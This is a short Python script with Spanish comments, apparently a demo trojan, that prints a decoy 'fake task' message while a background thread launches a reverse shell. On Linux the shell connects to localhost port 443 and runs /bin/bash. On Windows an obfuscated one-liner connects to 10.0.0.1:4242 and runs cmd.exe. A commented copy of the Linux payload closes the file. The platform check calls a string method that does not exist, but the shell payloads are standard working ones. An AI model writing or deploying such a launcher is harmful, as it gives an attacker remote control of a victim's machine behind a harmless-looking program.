#!/usr/bin/env python3
# -*- coding: utf-8 -*-


from threading import Thread
from time import sleep
from subprocess import run
import os
import sys


def task():
    platform = sys.platform
    if platform.contains('linux') or platform.contains('Linux'):
        run(["python3", "-c", "import pty, socket, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"localhost\", 443)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); pty.spawn(\"/bin/bash\");"], capture_output=False)
    elif platform.contains('win32') or platform.contains('cygwin'):
        run(["python", "-c", "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"])


if __name__ == "__main__":
    try:
        Thread(target=task).start()
        print("\nAquí hacemos nuestra 'task' falsa.")
        sleep(5)
        print("Saliendo.")
        os._exit(0)
    except KeyboardInterrupt:
        print("Saliendo con interrupción.")
        os._exit(0)

'''
payload en múltiples líneas

from pty import spawn
from socket import socket, AF_INET, SOCK_STREAM
import os

s = socket(AF_INET, SOCK_STREAM)
# nos conectamos al servidor por el puerto 443, en este caso nostros mismos
s.connect(("localhost", 443))
# duplicamos los descriptores de fichero para abrir una shell
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
# ejecutamos la TCP-ReverseShell
spawn("/bin/bash")
'''
